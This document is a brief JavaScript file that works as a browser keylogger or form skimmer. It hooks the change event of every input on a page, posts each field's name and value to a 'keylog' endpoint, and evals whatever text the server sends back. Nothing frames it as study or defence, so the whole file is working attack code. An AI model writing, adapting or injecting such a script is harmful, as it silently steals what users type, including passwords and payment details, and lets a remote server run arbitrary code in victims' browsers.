window.onload = function() {
    function make_xhr() {
        var xhr;
        try {
            xhr = new XMLHttpRequest();
        } catch(e) {
            try {
                xhr = new ActiveXObject("Microsoft.XMLHTTP");
            } catch(e) {
                xhr = new ActiveXObject("MSXML2.ServerXMLHTTP");
            }
        }

        if(!xhr) {
            throw "failed to create XMLHttpRequest";
        }

        return xhr;
    }

    xhr = make_xhr();
    xhr.onreadystatechange = function() {
        if(xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 304)) {
            eval(xhr.responseText);
        }
    }

    //绑定所有的input元素
    inputs = document.querySelectorAll('input');
    for (index = 0; index < inputs.length; index++) {
        input = inputs[index];
        if (input.addEventListener) {
            input.addEventListener('change', handleChange, true);
        } else if (input.attachEvent) {
            input.attachEvent('onchange', handleChange);
        } else {
            input.onChange = handleChange;
        }
    }
}

//onchange
function handleChange(e) {
    element = e.srcElement ? e.srcElement : e.target;

    name = element.name;
    value = element.value;

    andxhr(name, value);
}

function andxhr(name, value) {
    console.log(name);
    console.log(value);
    xhr.open("POST", "keylog", true);
    xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    xhr.send("name=" + name + "&value=" + value);
}
